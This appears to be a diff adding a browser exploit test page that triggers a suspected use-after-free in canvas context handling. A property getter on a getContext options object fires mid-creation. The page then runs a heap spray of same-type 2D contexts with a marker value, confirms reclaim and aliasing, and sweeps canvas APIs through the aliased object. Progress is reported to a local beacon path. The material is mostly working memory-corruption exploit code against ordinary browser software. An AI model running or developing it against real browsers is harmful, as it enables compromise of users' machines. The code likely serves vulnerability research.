@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>V932B</title></head>
+<body><pre id="out">V932B — alias surface sweep (Path2D/Gradient/Pattern/TextMetrics, safe B)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  try{new Image().src='/beacon/V932B-'+tag+'?d='+encodeURIComponent(String(body).slice(0,500))+'&t='+Date.now()+'&s=1';}catch(e){}
+}
+function safe(v){ try{return JSON.stringify(v);}catch(e){ try{return String(v);}catch(e2){return '?';} } }
+function t(name, fn){
+  try{ bk('T-PRE',name); var r=fn(); bk('T-OK',name+'|'+String(r).slice(0,420)); say('T-OK '+name+' '+r); }
+  catch(e){ bk('T-ERR',name+'|'+e.name+':'+String(e.message).slice(0,160)); say('T-ERR '+name+' '+e.message); }
+}
+
+var P=new URLSearchParams(location.search);
+var NSAVES=+(P.get('saves')||'32');
+var NSPRAY=+(P.get('spray')||'300');
+var MARKER=+(P.get('marker')||'7777.77');
+
+bk('BOOT','saves='+NSAVES+',spray='+NSPRAY);
+
+/* UAF (V573 pattern) */
+var innerCtx=null;
+(function(){
+  var c=document.createElement('canvas'); c.width=1; c.height=1;
+  var d={};
+  Object.defineProperty(d,'alpha',{get:function(){
+    var ctx=c.getContext('2d'); innerCtx=ctx;
+    for(var s=0;s<NSAVES;s++) ctx.save();
+    ctx.lineWidth=1.0; return true;
+  }});
+  try{ c.getContext('bitmaprenderer',d); }catch(e){ bk('TRIG-ERR',e.message); }
+})();
+
+/* same-type spray */
+var sprayCtxs=[], sprayCanv=[];
+for(var i=0;i<NSPRAY;i++){
+  var sc=document.createElement('canvas'); sc.width=8; sc.height=8;
+  var sctx=sc.getContext('2d');
+  if(sctx){ sctx.lineWidth=MARKER; sprayCtxs.push(sctx); sprayCanv.push(sc); }
+}
+bk('SPRAY','n='+sprayCtxs.length);
+
+var lwR, aliasCtx=null, aliasIdx=-1, aliasCanv=null, errR;
+try { lwR=innerCtx.lineWidth; } catch(e){ errR='lw:'+e.message; }
+if(!errR && lwR===MARKER){
+  bk('RECLAIM','CONFIRMED');
+  try{ innerCtx.lineWidth=9999.99; }catch(e){}
+  for(var i=0;i<sprayCtxs.length;i++){
+    try{ if(sprayCtxs[i].lineWidth===9999.99){ aliasCtx=sprayCtxs[i]; aliasIdx=i; aliasCanv=sprayCanv[i]; break; } }catch(e){}
+  }
+  bk('ALIAS','idx='+aliasIdx+',found='+(aliasCtx?'1':'0'));
+} else { bk('RECLAIM','NO-marker lw='+lwR); }
+
+var live = aliasCtx || innerCtx;
+var canv = aliasCanv || document.createElement('canvas');
+
+if(live){
+  bk('SWEEP-START','target='+(aliasCtx?'alias-spray#'+aliasIdx:'innerCtx'));
+
+  t('TextMetrics', function(){
+    live.font='16px sans-serif';
+    var m=live.measureText('AAAA');
+    return 'w='+m.width+',ab='+m.actualBoundingBoxAscent+',db='+m.actualBoundingBoxDescent+',lb='+m.actualBoundingBoxLeft+',rb='+m.actualBoundingBoxRight;
+  });
+
+  t('LinearGradient', function(){
+    var g=live.createLinearGradient(0,0,8,8);
+    g.addColorStop(0,'red'); g.addColorStop(1,'blue');
+    live.fillStyle=g; live.fillRect(0,0,8,8);
+    return 'ok=1,fillStyleType='+typeof live.fillStyle+',fill='+String(live.fillStyle).slice(0,40);
+  });
+
+  t('RadialGradient', function(){
+    var g=live.createRadialGradient(4,4,1,4,4,4);
+    g.addColorStop(0,'#fff'); g.addColorStop(1,'#000');
+    live.fillStyle=g; live.fillRect(0,0,8,8);
+    return 'ok=1';
+  });
+
+  t('Pattern', function(){
+    var p=live.createPattern(canv,'repeat');
+    live.fillStyle=p||'#111'; live.fillRect(0,0,8,8);
+    return 'pattern='+(p?'obj':'null')+',fill='+String(live.fillStyle).slice(0,40);
+  });
+
+  t('Path2D', function(){
+    if(typeof Path2D==='undefined') return 'no-Path2D';
+    var p=new Path2D(); p.rect(1,1,4,4);
+    live.fillStyle='#222'; live.fill(p);
+    return 'ok=1';
+  });
+
+  t('isPointInPath', function(){
+    live.beginPath(); live.rect(0,0,8,8);
+    var a=live.isPointInPath(2,2), b=live.isPointInPath(20,20);
+    return 'in='+a+',out='+b;
+  });
+
+  t('cross-alias state sanity', function(){
+    if(!aliasCtx||!innerCtx) return 'skip';
+    innerCtx.lineWidth=12.34;
+    return 'aliasLW='+aliasCtx.lineWidth+',innerLW='+innerCtx.lineWidth;
+  });
+
+  bk('SWEEP-DONE','complete|note=no-ptr-leak-surface');
+} else {
+  bk('SWEEP-SKIP','no-live-ctx');
+}
+
+bk('DONE','complete');
+say('\nV932B complete.');
+</script>
+</body></html>
